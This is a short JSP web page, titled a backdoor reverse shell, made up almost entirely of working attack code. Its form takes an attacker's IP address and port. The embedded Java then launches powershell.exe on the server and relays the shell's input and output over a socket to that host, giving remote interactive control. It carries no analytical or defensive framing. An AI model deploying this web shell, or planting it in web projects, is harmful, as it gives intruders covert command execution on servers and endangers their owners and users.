<%@ page import="java.io.InputStream,java.io.OutputStream,java.net.Socket" %>
<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ip" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>
<%
if (request.getParameter("ip") != null && request.getParameter("port") != null) {
  String host = request.getParameter("ip");
  int port = Integer.parseInt(request.getParameter("port"));
  String cmd="powershell.exe";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
  Socket s=new Socket(host,port);
  InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
  OutputStream po=p.getOutputStream(),so=s.getOutputStream();
  while(!s.isClosed()) {
    while(pi.available()>0)
      so.write(pi.read());
    while(pe.available()>0)
      so.write(pe.read());
    while(si.available()>0)
      po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
      p.exitValue();
      break;
    }
    catch (Exception e){
    }
  };
  p.destroy();
  s.close();
}
%>